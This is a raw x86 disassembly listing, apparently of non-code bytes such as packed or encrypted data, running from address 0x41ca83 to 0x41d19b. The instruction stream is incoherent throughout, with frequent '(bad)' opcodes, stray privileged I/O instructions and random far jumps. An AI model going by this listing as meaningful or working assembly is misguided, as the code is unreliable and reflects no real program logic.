  41ca83:	add    al,0x2c
  41ca85:	fnstenv [edx+edx*4+0x42dcef11]
  41ca8c:	xchg   BYTE PTR [esi],cl
  41ca8e:	outs   dx,DWORD PTR ds:[esi]
  41ca8f:	or     dl,BYTE PTR [edi+0x42]
  41ca92:	add    al,0x1e
  41ca94:	xor    DWORD PTR [edi+0x3898fea0],0xffffffee
  41ca9b:	leave  
  41ca9c:	or     ebp,DWORD PTR [ebp-0x4b18642b]
  41caa2:	leave  
  41caa3:	sub    eax,0xd4408cbe
  41caa8:	pop    esp
  41caa9:	rcl    DWORD PTR [edi],1
  41caab:	or     al,0x2
  41caad:	cmp    esi,DWORD PTR [edi-0x176fb753]
  41cab3:	in     al,dx
  41cab4:	scas   al,BYTE PTR es:[edi]
  41cab5:	add    al,0xb3
  41cab7:	leave  
  41cab8:	dec    eax
  41cab9:	sub    ecx,edi
  41cabb:	out    dx,al
  41cabc:	fwait
  41cabd:	addr16 retf 0x1d2d
  41cac1:	inc    esp
  41cac2:	cli    
  41cac3:	xor    dl,BYTE PTR [esi+0x58]
  41cac6:	std    
  41cac7:	inc    esp
  41cac8:	jo     0x41cae9
  41caca:	fidiv  WORD PTR [edi]
  41cacc:	sub    eax,0xbe55207b
  41cad1:	retf   0x128a
  41cad4:	adc    al,0x81
  41cad6:	(bad)  
  41cad7:	pop    ds
  41cad8:	push   ebx
  41cad9:	das    
  41cada:	sub    al,0xc
  41cadc:	jo     0x41cb14
  41cade:	shl    bl,cl
  41cae0:	mov    ch,dh
  41cae2:	and    ah,BYTE PTR [ebx-0x68]
  41cae5:	dec    esi
  41cae6:	ins    DWORD PTR es:[edi],dx
  41cae7:	jge    0x41cacb
  41cae9:	dec    ecx
  41caea:	scas   eax,DWORD PTR es:[edi]
  41caeb:	xchg   edi,eax
  41caec:	icebp  
  41caed:	push   0xffffffbb
  41caef:	call   0xf86c:0x47df6c01
  41caf6:	inc    ebp
  41caf7:	hlt    
  41caf8:	rcr    edx,cl
  41cafa:	xor    al,0xdf
  41cafc:	dec    esp
  41cafe:	xor    eax,0xf53fc1f8
  41cb03:	imul   edx,DWORD PTR cs:[ecx+0x2b],0x1a
  41cb08:	adc    cl,BYTE PTR [edx-0x1c]
  41cb0b:	push   cs
  41cb0c:	and    esp,DWORD PTR ds:0x978ac47e
  41cb12:	sbb    ebp,DWORD PTR [ecx-0x25]
  41cb15:	adc    DWORD PTR [edi-0x569f603],eax
  41cb1b:	xchg   edx,eax
  41cb1c:	pop    ds
  41cb1d:	jb     0x41cb50
  41cb1f:	add    DWORD PTR [ecx],0x6df9dee5
  41cb25:	sub    DWORD PTR [eax+0x4e102efc],0x4d
  41cb2c:	mov    WORD PTR ds:0x18d8e2c1,fs
  41cb32:	sbb    ecx,edx
  41cb34:	aad    0xa5
  41cb36:	pop    ds
  41cb37:	dec    esi
  41cb38:	inc    ecx
  41cb39:	or     al,0x4f
  41cb3b:	nop
  41cb3c:	jge    0x41caf4
  41cb3e:	mov    edi,0x168c60a2
  41cb43:	inc    ebp
  41cb44:	inc    ebx
  41cb45:	adc    esi,DWORD PTR [edi]
  41cb47:	sbb    al,0x22
  41cb49:	mov    esi,0x5adc5d81
  41cb4e:	ficomp DWORD PTR [esi]
  41cb50:	sahf   
  41cb51:	xchg   esp,eax
  41cb52:	pop    edi
  41cb53:	cmc    
  41cb54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb55:	(bad)  
  41cb56:	addr16 rcl ecx,1
  41cb59:	ins    BYTE PTR es:[edi],dx
  41cb5a:	es push ss
  41cb5c:	mov    bl,0xd5
  41cb5e:	int    0x9
  41cb60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb61:	sub    al,cl
  41cb63:	(bad)  
  41cb64:	clc    
  41cb65:	enter  0x9973,0x58
  41cb69:	ror    BYTE PTR [esi-0x56af846d],0x7a
  41cb70:	mov    eax,0x9c1e4462
  41cb75:	sti    
  41cb76:	dec    eax
  41cb77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb78:	call   0x8d80:0xe2e020df
  41cb7f:	iret   
  41cb80:	dec    esp
  41cb81:	retf   
  41cb82:	push   ds
  41cb83:	cld    
  41cb84:	in     al,dx
  41cb85:	push   ds
  41cb86:	mov    ebx,0x47d3fb8
  41cb8b:	jp     0x41cbcd
  41cb8d:	add    bl,BYTE PTR [edi]
  41cb8f:	ds adc eax,0x5f260bf7
  41cb95:	sub    eax,0x3e83abb0
  41cb9a:	jne    0x41cb25
  41cb9c:	mov    edi,0x3775b25e
  41cba1:	iret   
  41cba2:	inc    edi
  41cba3:	dec    esi
  41cba4:	popf   
  41cba5:	push   0x9c48d1cf
  41cbaa:	pop    ds
  41cbab:	jp     0x41cc14
  41cbad:	dec    ebx
  41cbae:	sahf   
  41cbaf:	inc    ebp
  41cbb0:	imul   edi,DWORD PTR [ebx],0xffffff98
  41cbb3:	xchg   al,dl
  41cbb5:	ins    BYTE PTR es:[edi],dx
  41cbb6:	leave  
  41cbb7:	cmp    BYTE PTR [eax-0x7d],bh
  41cbba:	cmp    esi,DWORD PTR [ecx-0x24]
  41cbbd:	stos   BYTE PTR es:[edi],al
  41cbbe:	rol    DWORD PTR [edx-0x2e],0x7e
  41cbc2:	xchg   BYTE PTR [ebp+ebx*1-0x4a296d35],al
  41cbc9:	lock jae 0x41cbf1
  41cbcc:	popa   
  41cbcd:	fs cmp al,0x7d
  41cbd0:	jns    0x41cbd9
  41cbd2:	add    BYTE PTR [edi],ch
  41cbd4:	dec    esi
  41cbd5:	repnz cdq 
  41cbd7:	fldcw  WORD PTR [ecx]
  41cbd9:	add    al,0x21
  41cbdb:	call   0x9e22:0x344eec9f
  41cbe2:	jb     0x41cbb1
  41cbe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbe5:	fs push edi
  41cbe7:	jae    0x41cbc8
  41cbe9:	add    BYTE PTR [ebx],dh
  41cbeb:	nop
  41cbec:	xor    DWORD PTR [ecx-0x6027a5df],esi
  41cbf2:	daa    
  41cbf3:	mov    ecx,0x5ac1bab6
  41cbf8:	lock xchg esp,eax
  41cbfa:	xchg   ebx,eax
  41cbfb:	inc    edi
  41cbfc:	jno    0x41cb90
  41cbfe:	pop    ds
  41cbff:	pusha  
  41cc00:	in     al,0xb9
  41cc02:	jle    0x41cbc8
  41cc04:	scas   eax,DWORD PTR es:[di]
  41cc06:	sub    BYTE PTR [edx+0x7dd3b7f1],al
  41cc0c:	dec    eax
  41cc0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc0e:	add    BYTE PTR gs:[edx+ecx*1-0x7c],ah
  41cc13:	mov    dh,0xb9
  41cc15:	fstp   DWORD PTR [ecx-0x38]
  41cc18:	push   ss
  41cc19:	jl     0x41cc1a
  41cc1b:	mov    edi,0xbc6c0a90
  41cc20:	and    eax,0xb5f80161
  41cc25:	add    BYTE PTR [ebx-0x2840d709],bl
  41cc2b:	mov    ch,al
  41cc2d:	ins    DWORD PTR es:[edi],dx
  41cc2e:	mov    WORD PTR [esi+0x311221f],ds
  41cc34:	xchg   ebx,eax
  41cc35:	jmp    0xaed1:0xc3cd212e
  41cc3c:	outs   dx,DWORD PTR ds:[esi]
  41cc3d:	test   eax,0x7325c050
  41cc42:	fisttp WORD PTR [ecx-0x7a]
  41cc45:	push   0xffffffc8
  41cc47:	pusha  
  41cc48:	in     eax,0xa
  41cc4a:	pop    edi
  41cc4b:	jns    0x41cc39
  41cc4d:	stos   BYTE PTR es:[edi],al
  41cc4e:	lods   eax,DWORD PTR ds:[esi]
  41cc4f:	push   esi
  41cc50:	imul   dh
  41cc52:	pushf  
  41cc53:	int    0x8a
  41cc55:	imul   esp,DWORD PTR [eax+0x49],0xfffffffc
  41cc59:	je     0x41ccc9
  41cc5b:	inc    eax
  41cc5c:	inc    edi
  41cc5d:	mov    al,bh
  41cc5f:	mov    ebx,0x5d96b3ab
  41cc64:	cmp    DWORD PTR [ebp+0x71],esp
  41cc67:	jl     0x41ccc7
  41cc69:	fnstenv [ebx-0x746d0977]
  41cc6f:	repnz inc edi
  41cc71:	mov    bh,0xe9
  41cc73:	pop    ecx
  41cc74:	mov    ch,0xe3
  41cc76:	xlat   BYTE PTR ds:[ebx]
  41cc77:	xor    ebx,ecx
  41cc79:	mov    dh,0xc1
  41cc7b:	add    eax,edx
  41cc7d:	inc    edi
  41cc7e:	ret    
  41cc7f:	sbb    DWORD PTR [ebx-0x2d],0x60
  41cc83:	add    cl,al
  41cc85:	mov    cl,0x1a
  41cc87:	inc    ebx
  41cc88:	dec    esi
  41cc89:	out    0x2c,al
  41cc8b:	(bad)  
  41cc8c:	out    0xea,al
  41cc8e:	mov    edx,0xf0906f71
  41cc93:	jbe    0x41ccc5
  41cc95:	adc    esi,DWORD PTR [ecx-0x7de6f5fc]
  41cc9b:	ins    DWORD PTR es:[edi],dx
  41cc9c:	xchg   BYTE PTR [ebx],bl
  41cc9e:	push   es
  41cc9f:	or     edi,edx
  41cca1:	xor    ebp,ebp
  41cca3:	inc    ecx
  41cca4:	pop    ds
  41cca5:	test   DWORD PTR ds:[eax-0x46e68756],esp
  41ccac:	cmp    ah,cl
  41ccae:	popf   
  41ccaf:	xchg   BYTE PTR [esi+0x3e],ch
  41ccb2:	stc    
  41ccb3:	and    eax,DWORD PTR [edx+ebx*4]
  41ccb6:	mov    eax,ds:0x8be79b6
  41ccbb:	imul   edx,DWORD PTR [edx+esi*8+0x6],0x36
  41ccc0:	or     dl,0x45
  41ccc3:	dec    ecx
  41ccc4:	cwde   
  41ccc5:	(bad)  
  41ccc6:	sti    
  41ccc7:	and    cl,BYTE PTR [ebx-0xe97d9a3]
  41cccd:	cmp    ah,BYTE PTR [ebx+0x24]
  41ccd0:	or     al,0x44
  41ccd2:	jnp    0x41cd38
  41ccd4:	pop    ebx
  41ccd5:	pushf  
  41ccd6:	(bad)  
  41ccd7:	sub    edx,ecx
  41ccd9:	ret    0xec51
  41ccdc:	int3   
  41ccdd:	test   BYTE PTR [edi+0x539ff672],dl
  41cce3:	fdecstp 
  41cce5:	add    cl,BYTE PTR [edi+eiz*1]
  41cce8:	xlat   BYTE PTR ds:[ebx]
  41cce9:	sahf   
  41ccea:	(bad)  
  41cceb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccec:	scas   eax,DWORD PTR es:[edi]
  41cced:	push   ebp
  41ccee:	cld    
  41ccef:	adc    al,0x8b
  41ccf1:	xchg   esp,eax
  41ccf2:	inc    esi
  41ccf3:	push   eax
  41ccf4:	jg     0x41cc7b
  41ccf6:	cmp    eax,edi
  41ccf8:	shr    DWORD PTR [eax],0x9
  41ccfb:	ss test esp,ecx
  41ccfe:	aas    
  41ccff:	idiv   DWORD PTR ds:0x205a05dd
  41cd05:	pop    eax
  41cd06:	sahf   
  41cd07:	or     eax,0x20b13499
  41cd0c:	jo     0x41cd57
  41cd0e:	jle    0x41cd0e
  41cd10:	inc    edi
  41cd11:	adc    bl,bl
  41cd13:	sub    DWORD PTR [ebx+0x241b8c2a],0xc7205c
  41cd1d:	add    eax,0x71e534c2
  41cd22:	jmp    0xe5cf:0x57a6776a
  41cd29:	add    eax,0x5b508b22
  41cd2e:	js     0x41cd43
  41cd30:	pusha  
  41cd31:	mov    cs,WORD PTR [ebx-0x43]
  41cd34:	in     eax,0xca
  41cd36:	mov    ecx,0x4ad490ac
  41cd3b:	js     0x41cd77
  41cd3d:	rcl    bl,0xba
  41cd40:	js     0x41cd4a
  41cd42:	xchg   ebx,eax
  41cd43:	mov    ah,BYTE PTR [eax+0x68611c55]
  41cd49:	push   edi
  41cd4a:	in     eax,0x25
  41cd4c:	out    0x3b,eax
  41cd4e:	mov    esi,esp
  41cd50:	jb     0x41cd2d
  41cd52:	test   al,0xdb
  41cd54:	and    esi,DWORD PTR [eax+0x1497771a]
  41cd5a:	pop    edx
  41cd5b:	cmc    
  41cd5c:	out    0xad,al
  41cd5e:	sti    
  41cd5f:	imul   ebx,DWORD PTR [edi+0x43],0x7
  41cd63:	fiadd  DWORD PTR [esi]
  41cd65:	bnd jge 0x41cd24
  41cd68:	cmp    bh,BYTE PTR [ebp+0x3d]
  41cd6b:	sub    al,0xc8
  41cd6d:	fcmovnu st,st(7)
  41cd6f:	retf   
  41cd70:	packuswb mm7,QWORD PTR [edx+esi*4]
  41cd74:	sbb    DWORD PTR [eax+0x7b],ebx
  41cd77:	push   es
  41cd78:	push   esp
  41cd79:	fidivr WORD PTR [edx]
  41cd7b:	dec    ebp
  41cd7c:	xor    al,0xed
  41cd7e:	shl    BYTE PTR [ebx],1
  41cd80:	pushf  
  41cd81:	jmp    0x795e:0xfbaf9b83
  41cd88:	and    DWORD PTR [ecx],esp
  41cd8a:	push   ebp
  41cd8b:	int3   
  41cd8c:	pop    es
  41cd8d:	(bad)  
  41cd8f:	or     al,0xca
  41cd91:	pop    ebx
  41cd92:	fcomip st,st(5)
  41cd94:	sti    
  41cd95:	test   BYTE PTR ds:0xb210b398,0xb8
  41cd9c:	mov    ah,0x43
  41cd9e:	lea    esp,[edi+ebp*8+0x74]
  41cda2:	aas    
  41cda3:	and    BYTE PTR [eax],0xa5
  41cda6:	hlt    
  41cda7:	dec    ebp
  41cda8:	(bad)  
  41cda9:	push   ecx
  41cdaa:	in     al,0x8b
  41cdac:	mov    ebx,0xe6389184
  41cdb1:	add    BYTE PTR [edi-0x1],al
  41cdb4:	inc    ebx
  41cdb5:	xor    esi,eax
  41cdb7:	loopne 0x41cde2
  41cdb9:	sti    
  41cdba:	or     edi,ebx
  41cdbc:	leave  
  41cdbd:	in     al,0xe9
  41cdbf:	loope  0x41cdef
  41cdc1:	push   ss
  41cdc2:	jg     0x41ce26
  41cdc4:	push   edi
  41cdc5:	shl    BYTE PTR [ecx-0x480b5328],cl
  41cdcb:	inc    esp
  41cdcc:	rcr    BYTE PTR [ebp-0x29529184],0xf9
  41cdd3:	xlat   BYTE PTR ds:[ebx]
  41cdd4:	out    0x74,al
  41cdd6:	sub    esi,DWORD PTR es:[ecx]
  41cdd9:	mov    al,ds:0x3179dd92
  41cdde:	aas    
  41cddf:	int    0xfa
  41cde1:	inc    ebp
  41cde2:	jmp    0x736d:0x33c966c6
  41cde9:	sub    al,0xa7
  41cdeb:	push   cs
  41cdec:	sbb    al,0xfe
  41cdee:	adc    al,0x8b
  41cdf0:	popf   
  41cdf1:	add    al,0xf9
  41cdf3:	popa   
  41cdf4:	or     eax,0x16aa687b
  41cdf9:	dec    edi
  41cdfa:	mov    edi,0x7c8ed317
  41cdff:	push   ecx
  41ce00:	pop    es
  41ce01:	ins    DWORD PTR es:[edi],dx
  41ce02:	cmp    BYTE PTR [ebx],dl
  41ce04:	retf   0xc476
  41ce07:	ss cmp ecx,edx
  41ce0a:	repnz and DWORD PTR [ecx+0x6e],0x40
  41ce0f:	xchg   BYTE PTR fs:[eax-0x78],dl
  41ce13:	inc    eax
  41ce14:	imul   ecx,DWORD PTR [edi+0x67],0xc5e85ff3
  41ce1b:	dec    ecx
  41ce1c:	push   esi
  41ce1d:	ins    BYTE PTR es:[edi],dx
  41ce1e:	rcr    DWORD PTR [esi-0x6f],1
  41ce21:	sub    DWORD PTR [esi+0x62],esp
  41ce24:	pop    esp
  41ce25:	stc    
  41ce26:	xor    ah,BYTE PTR [edx+0x293fc7cc]
  41ce2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce2d:	and    eax,0x113a39d4
  41ce32:	mov    ds:0x5ba85f8,al
  41ce37:	adc    al,0xa7
  41ce3a:	dec    edx
  41ce3b:	jp     0x41ce6c
  41ce3d:	mov    DWORD PTR es:[esi],esi
  41ce40:	mov    ecx,0x9d9b4579
  41ce45:	ret    
  41ce46:	addr16 pushf 
  41ce48:	mov    DWORD PTR [ebx+0x1f],edi
  41ce4b:	xor    bh,BYTE PTR [ecx+0x4ea0134a]
  41ce51:	fiadd  DWORD PTR [edi+edx*8]
  41ce54:	add    al,0xd7
  41ce56:	sbb    DWORD PTR [ebx+0x50fd082a],esp
  41ce5c:	and    eax,edi
  41ce5e:	xor    BYTE PTR [edx-0x58],ah
  41ce61:	inc    esp
  41ce62:	pop    eax
  41ce63:	(bad)  
  41ce64:	scas   eax,DWORD PTR es:[edi]
  41ce65:	bnd jo 0x41ceb5
  41ce68:	xor    ebx,edi
  41ce6a:	ss adc ebx,ebp
  41ce6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce6e:	in     al,dx
  41ce6f:	or     edi,ebx
  41ce71:	push   eax
  41ce72:	mov    ecx,0x8c53e3b2
  41ce77:	inc    ebp
  41ce78:	jp     0x41ce4f
  41ce7a:	stos   DWORD PTR es:[edi],eax
  41ce7b:	rcl    DWORD PTR [ecx-0x14534de0],cl
  41ce81:	xchg   edi,eax
  41ce82:	xchg   esp,eax
  41ce83:	ret    
  41ce84:	adc    dl,0x65
  41ce87:	sbb    edx,DWORD PTR [ebx]
  41ce89:	popa   
  41ce8a:	push   DWORD PTR [ebx]
  41ce8c:	sar    DWORD PTR ds:0x7598ba41,1
  41ce92:	pop    esp
  41ce94:	add    al,0xa8
  41ce96:	xor    al,0x2
  41ce98:	les    esi,FWORD PTR [edi-0x475da3bb]
  41ce9e:	mov    DWORD PTR [edx+0x1a],ecx
  41cea1:	xor    DWORD PTR [eax+eiz*1-0xf],edx
  41cea5:	rcl    bl,cl
  41cea7:	inc    eax
  41cea8:	outs   dx,DWORD PTR ds:[esi]
  41cea9:	and    al,0x62
  41ceab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceac:	popa   
  41cead:	or     al,0xed
  41ceaf:	lods   eax,DWORD PTR ds:[esi]
  41ceb0:	mov    ?,WORD PTR [ecx]
  41ceb2:	mov    al,0x61
  41ceb4:	and    bh,bl
  41ceb6:	stos   DWORD PTR es:[edi],eax
  41ceb7:	aaa    
  41ceb8:	dec    ebp
  41ceb9:	sahf   
  41ceba:	fcom   DWORD PTR [ecx+0x6b4c7a4]
  41cec0:	jne    0x41ceda
  41cec2:	aad    0x99
  41cec4:	mov    ebp,0x2e06837e
  41cec9:	daa    
  41ceca:	xlat   BYTE PTR ds:[ebx]
  41cecb:	arpl   WORD PTR [edi],sp
  41cecd:	repnz mov ds:0x7ac88c78,al
  41ced3:	ins    DWORD PTR es:[edi],dx
  41ced4:	outs   dx,BYTE PTR ds:[esi]
  41ced5:	lock xor BYTE PTR [edi],dl
  41ced8:	jnp    0x41cf33
  41ceda:	cmp    ebp,DWORD PTR [edx]
  41cedc:	or     al,0x34
  41cede:	bound  ecx,QWORD PTR [ebp-0x5dd0e7cb]
  41cee4:	call   0x1626236f
  41cee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceea:	sub    dh,bh
  41ceec:	cdq    
  41ceed:	xchg   DWORD PTR [eax-0xd38046e],eax
  41cef3:	push   ds
  41cef4:	fwait
  41cef5:	test   BYTE PTR [ebx],dl
  41cef7:	mov    ch,0x1b
  41cef9:	aam    0x78
  41cefb:	push   ecx
  41cefc:	jg     0x41cf47
  41cefe:	adc    al,0x71
  41cf00:	mov    bh,0xd5
  41cf02:	fistp  WORD PTR [ecx-0x3a]
  41cf05:	int    0x9e
  41cf07:	hlt    
  41cf08:	or     DWORD PTR [edi+0x7d],0xffffff8e
  41cf0c:	jmp    0x41cf3b
  41cf0e:	or     al,0x36
  41cf10:	(bad)  
  41cf11:	mov    al,ds:0xcd504730
  41cf17:	mov    ecx,0x6d1a930e
  41cf1c:	mov    esp,0x8bd76591
  41cf21:	inc    esp
  41cf22:	pop    ecx
  41cf23:	mov    ds:0x6b84321d,eax
  41cf28:	loopne 0x41cee6
  41cf2a:	rol    DWORD PTR [ebx],cl
  41cf2c:	mov    esi,DWORD PTR ds:0xb2e676f0
  41cf32:	xchg   esp,eax
  41cf33:	pop    eax
  41cf34:	pop    esp
  41cf35:	pop    esi
  41cf36:	jmp    0x5b71:0x341ff1dc
  41cf3d:	inc    esi
  41cf3e:	dec    edi
  41cf3f:	sub    ebx,eax
  41cf41:	mov    esi,0xd50edfb6
  41cf46:	mov    ebx,0x5af89c8b
  41cf4b:	jnp    0x41cf85
  41cf4d:	ret    
  41cf4e:	cmc    
  41cf4f:	push   ss
  41cf50:	push   0xffffffad
  41cf52:	xor    eax,0x50e16a53
  41cf57:	ins    BYTE PTR es:[edi],dx
  41cf58:	cmp    BYTE PTR [esi+ebp*4],0x20
  41cf5c:	inc    ecx
  41cf5d:	or     eax,0xd0fc3276
  41cf62:	retf   0x1d3c
  41cf65:	add    ah,BYTE PTR [eax+0x2]
  41cf68:	fwait
  41cf69:	cdq    
  41cf6a:	pop    eax
  41cf6b:	jle    0x41cf12
  41cf6d:	dec    ebp
  41cf6e:	dec    edi
  41cf6f:	mov    bh,0x22
  41cf71:	sbb    al,0xd2
  41cf73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf74:	in     al,0x4c
  41cf76:	add    eax,0xe4b99627
  41cf7b:	repnz cmp BYTE PTR [ecx+0x14],0x99
  41cf80:	or     eax,0x7ce96048
  41cf85:	inc    ecx
  41cf86:	sti    
  41cf87:	and    DWORD PTR [ebx+0x55],edx
  41cf8a:	xchg   esp,eax
  41cf8b:	imul   esi,DWORD PTR [ebp-0x6673c37e],0xb1ff0bbb
  41cf95:	retf   0x56dc
  41cf98:	aas    
  41cf99:	push   ebx
  41cf9a:	mov    dh,0x11
  41cf9c:	ja     0x41cf96
  41cf9e:	xor    eax,0xd27335ed
  41cfa3:	stc    
  41cfa4:	clc    
  41cfa5:	add    al,0x61
  41cfa7:	rcr    ah,1
  41cfa9:	(bad)  
  41cfaa:	(bad)  
  41cfab:	fcomip st,st(5)
  41cfad:	xor    cl,BYTE PTR [ecx-0x2f]
  41cfb0:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41cfb2:	add    edx,DWORD PTR [eax-0x8]
  41cfb5:	lahf   
  41cfb6:	nop
  41cfb7:	pop    ebx
  41cfb8:	mov    al,0xdd
  41cfba:	ss (bad) 
  41cfbc:	jne    0x41cfd8
  41cfbe:	ret    0x90cf
  41cfc1:	sub    al,0x88
  41cfc3:	std    
  41cfc4:	pusha  
  41cfc5:	aam    0xa5
  41cfc7:	(bad)  
  41cfc8:	mov    ds:0x221a5bb6,eax
  41cfcd:	ror    BYTE PTR [edx+0x65],cl
  41cfd0:	rcl    DWORD PTR [ebp+0x51cb1755],0x4a
  41cfd7:	lods   eax,DWORD PTR ds:[esi]
  41cfd8:	xor    dl,dl
  41cfda:	rol    BYTE PTR [eax-0x29f79b4f],1
  41cfe0:	cmp    BYTE PTR [ebx],ah
  41cfe2:	rol    BYTE PTR [edi+0x31],cl
  41cfe5:	cmp    bh,cl
  41cfe7:	add    DWORD PTR [esi+eax*1-0x5a],ebx
  41cfeb:	std    
  41cfec:	inc    ebx
  41cfed:	js     0x41cf77
  41cfef:	out    dx,al
  41cff0:	sti    
  41cff1:	mov    dl,0x91
  41cff3:	std    
  41cff4:	lock inc esi
  41cff6:	lahf   
  41cff7:	and    eax,0xe3141abb
  41cffc:	fwait
  41cffd:	in     eax,0x67
  41cfff:	stos   DWORD PTR es:[edi],eax
  41d000:	loope  0x41d03c
  41d002:	xor    DWORD PTR [ecx],ebp
  41d004:	mov    ds:0x18ecbe9e,eax
  41d009:	dec    edi
  41d00a:	shl    BYTE PTR [edx+ebp*4+0x2],0x98
  41d00f:	xor    al,0x16
  41d011:	pop    es
  41d012:	jnp    0x41d05b
  41d014:	jmp    eax
  41d016:	pop    ebp
  41d017:	jne    0x41d055
  41d019:	cdq    
  41d01a:	fmul   QWORD PTR [ebx+0x3f]
  41d01d:	pop    es
  41d01e:	jp     0x41d07e
  41d020:	pop    eax
  41d021:	mov    DWORD PTR [ebx+0x51],esp
  41d024:	in     eax,0x9c
  41d026:	xchg   ecx,eax
  41d027:	aaa    
  41d028:	div    BYTE PTR [eax]
  41d02a:	fwait
  41d02b:	add    BYTE PTR [ebp-0x36],cl
  41d02e:	adc    edx,DWORD PTR [edi-0x2c]
  41d031:	fs dec ecx
  41d033:	xor    cl,BYTE PTR [esi+0x4d]
  41d036:	mov    bl,0xc9
  41d038:	pop    edx
  41d039:	mov    eax,ds:0x833f1565
  41d03e:	xchg   edx,eax
  41d03f:	mov    ch,0x95
  41d041:	fs loopne 0x41cfeb
  41d044:	mov    cl,0xf1
  41d046:	sub    al,0x48
  41d048:	outs   dx,BYTE PTR ds:[esi]
  41d049:	and    al,0x88
  41d04b:	sahf   
  41d04c:	push   es
  41d04d:	mov    bh,BYTE PTR [ebx+0x49d8d61b]
  41d053:	dec    eax
  41d054:	pushf  
  41d055:	mov    ebp,0x3855d22c
  41d05a:	rcl    DWORD PTR [edx-0x5269fee3],1
  41d060:	xor    BYTE PTR [eax],cl
  41d062:	push   ebp
  41d063:	inc    ecx
  41d064:	cmp    BYTE PTR [eax],dl
  41d066:	or     esp,edx
  41d068:	jecxz  0x41d089
  41d06a:	outs   dx,DWORD PTR ds:[esi]
  41d06b:	or     eax,0xba66ddf9
  41d070:	xchg   esp,eax
  41d071:	sub    DWORD PTR [ecx],edx
  41d073:	cld    
  41d074:	cmc    
  41d075:	neg    BYTE PTR [ebx+0x1e]
  41d078:	das    
  41d079:	mov    cl,0xfa
  41d07b:	or     BYTE PTR [esi-0x35bd1114],dh
  41d081:	jb     0x41d094
  41d083:	inc    edi
  41d084:	or     esi,DWORD PTR [eax+0x39]
  41d087:	mov    esp,0x1ea498a9
  41d08c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d08d:	imul   edx,DWORD PTR [edi-0x7e7ca187],0xa7051581
  41d097:	sti    
  41d098:	sub    BYTE PTR [edx-0x37145940],bh
  41d09e:	push   0x31
  41d0a0:	jg     0x41d096
  41d0a2:	stos   DWORD PTR es:[edi],eax
  41d0a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0a4:	es call 0x867b:0x8fe38042
  41d0ac:	icebp  
  41d0ad:	mov    ah,dl
  41d0af:	jg     0x41d057
  41d0b1:	adc    BYTE PTR [edx+0xb],al
  41d0b4:	jle    0x41d056
  41d0b6:	xadd   DWORD PTR [esi+esi*4+0x13678b81],edx
  41d0be:	mov    ecx,0xa31afc18
  41d0c3:	adc    al,0xf6
  41d0c5:	and    eax,0xf0e4cad
  41d0ca:	or     edi,DWORD PTR es:[esi-0xe]
  41d0ce:	retf   0xec
  41d0d1:	loop   0x41d054
  41d0d3:	sub    DWORD PTR [ecx],eax
  41d0d5:	inc    esp
  41d0d6:	add    eax,0xe44aa4df
  41d0db:	jmp    0x206b6e43
  41d0e0:	pop    ecx
  41d0e1:	(bad)  
  41d0e2:	shr    cl,0xa7
  41d0e5:	fs sbb ch,ch
  41d0e8:	stos   DWORD PTR es:[edi],eax
  41d0e9:	mov    ebp,0x851b67de
  41d0ee:	sub    eax,0xc2483d1d
  41d0f3:	push   ds
  41d0f4:	jmp    0x26d3:0x6e32ceab
  41d0fb:	out    dx,eax
  41d0fc:	loopne 0x41d101
  41d0fe:	jno    0x41d08e
  41d100:	int    0xec
  41d102:	(bad)  
  41d103:	mov    bl,0x7d
  41d105:	push   ecx
  41d106:	and    al,0x25
  41d108:	iret   
  41d109:	cmc    
  41d10a:	inc    ebp
  41d10b:	lahf   
  41d10c:	out    dx,al
  41d10d:	rol    BYTE PTR [ebx],0x1b
  41d110:	xor    al,0x89
  41d112:	cli    
  41d113:	popa   
  41d114:	or     bh,BYTE PTR [ecx]
  41d116:	imul   ebp,DWORD PTR [ebp+0x71be3661],0xeb01f81f
  41d120:	mov    esp,0x3e03928e
  41d125:	mov    bl,0xa6
  41d127:	sbb    BYTE PTR [ecx-0x24d20e0],ch
  41d12d:	pop    edx
  41d12e:	xor    ch,BYTE PTR [ecx-0x1c9a03f5]
  41d134:	in     al,0xe3
  41d136:	or     al,0x2b
  41d138:	add    BYTE PTR [eax*8-0x47872f0],cl
  41d13f:	push   eax
  41d140:	dec    ebx
  41d141:	fwait
  41d142:	pop    es
  41d143:	loopne 0x41d170
  41d145:	lods   eax,DWORD PTR ds:[esi]
  41d146:	outs   dx,DWORD PTR ds:[esi]
  41d147:	dec    eax
  41d148:	hlt    
  41d149:	pop    es
  41d14a:	daa    
  41d14b:	and    al,0xbd
  41d14d:	in     al,dx
  41d14e:	add    BYTE PTR [edi-0x79],cl
  41d151:	(bad)  
  41d152:	mov    dh,0xcb
  41d154:	pop    esp
  41d155:	xchg   ebp,eax
  41d156:	mov    ds:0xea9ae430,al
  41d15b:	xchg   edi,eax
  41d15c:	push   ebx
  41d15d:	cmp    BYTE PTR [edx],bl
  41d15f:	or     DWORD PTR [esi],esp
  41d161:	adc    BYTE PTR [esi],dh
  41d163:	pop    ecx
  41d164:	mov    ds:0x85ed1d60,al
  41d169:	in     al,dx
  41d16a:	cli    
  41d16b:	test   eax,0xe5d2a84d
  41d170:	(bad)  
  41d171:	or     al,0x2d
  41d173:	and    BYTE PTR [ebx+0x28],cl
  41d176:	bound  eax,QWORD PTR [edx-0x416eba02]
  41d17c:	fwait
  41d17d:	icebp  
  41d17e:	pop    DWORD PTR [ecx+0xcd4d115]
  41d184:	xchg   edi,eax
  41d185:	outs   dx,BYTE PTR ds:[esi]
  41d186:	ret    0xb8e8
  41d189:	xchg   DWORD PTR [eax+esi*8+0x420e5790],esp
  41d190:	(bad)  
  41d191:	in     eax,dx
  41d192:	stos   BYTE PTR es:[edi],al
  41d193:	fldcw  WORD PTR [esi-0x383fd55e]
  41d199:	leave  
  41d19a:	xlat   BYTE PTR ds:[ebx]
  41d19b:	cmp    eax,0x89471901
